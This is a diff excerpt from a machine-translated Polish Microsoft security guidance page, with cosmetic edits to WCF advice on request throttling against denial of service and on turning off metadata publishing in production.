-| **Kroki** | <p>Nie obrotu ograniczenie użycia zasobów systemowych może spowodować wyczerpanie zasobów, a ostatecznie typu "odmowa usługi".</p><ul><li>**Objaśnienie:** Windows Communication Foundation (WCF) oferuje możliwość ograniczania żądań obsługi. Zezwolenie zbyt wiele żądań klientów można zalać systemu i wyczerpaniu zasobów. Z drugiej strony dzięki czemu tylko niewielką liczbę żądań do usługi uniemożliwi autoryzowanych użytkowników przy użyciu usługi. Każda usługa powinna indywidualnie dostosowana do i skonfigurowany do zezwalania na odpowiednią ilość zasobów.</li><li>**Zalecenia dotyczące** funkcji ograniczania przepustowości usługi i ustawianie limitów Włącz WCF odpowiednie dla twojej aplikacji.</li></ul>|
+| **Kroki** | <p>Nie obrotu ograniczenie użycia zasobów systemowych może spowodować wyczerpanie zasobów, a ostatecznie typu "odmowa usługi".</p><ul><li>**OBJAŚNIENIE:** Windows Communication Foundation (WCF) oferuje możliwość ograniczania żądań obsługi. Zezwolenie zbyt wiele żądań klientów można zalać systemu i wyczerpaniu zasobów. Z drugiej strony dzięki czemu tylko niewielką liczbę żądań do usługi uniemożliwi autoryzowanych użytkowników przy użyciu usługi. Każda usługa powinna indywidualnie dostosowana do i skonfigurowany do zezwalania na odpowiednią ilość zasobów.</li><li>**Zalecenia dotyczące** funkcji ograniczania przepustowości usługi i ustawianie limitów Włącz WCF odpowiednie dla twojej aplikacji.</li></ul>|
 
 ### <a name="example"></a>Przykład
 Poniżej przedstawiono przykładową konfigurację po zastosowaniu ograniczania włączone:
@@ -623,11 +623,11 @@ Poniżej przedstawiono przykładową konfigurację po zastosowaniu ograniczania 
 
 ## <a id="info-metadata"></a>Ujawnienie informacji programu WCF za pomocą metadanych
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | WCF | 
 | **Faza SDL**               | Kompilacja |  
-| **Odpowiednich technologii** | .NET framework 3 |
+| **Odpowiednich technologii** | .NET Framework 3 |
 | **Atrybuty**              | ND  |
 | **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [wzmacnia Królestwa](https://vulncat.fortify.com) |
 | **Kroki** | Metadane mogą pomóc osobom atakującym plan forma ataku i Dowiedz się więcej o systemie. Usługi WCF można skonfigurować do udostępnienia metadanych. Metadane zapewnia informacje o opisie usługi szczegółowe i nie powinny być emisji w środowiskach produkcyjnych. `HttpGetEnabled`  /  `HttpsGetEnabled` Właściwości klasy serviceMetadata w pliku Określa, czy usługa udostępni metadanych | 
